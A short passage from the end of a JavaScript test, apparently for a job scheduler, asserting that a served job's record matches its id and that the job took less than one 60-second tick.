  assert.equal(records[0].job_id, SERVED.id);
  assert.ok(Date.parse(SERVED.completed_at) - Date.parse(SERVED.started_at) < 60_000, "shorter than one tick");
});
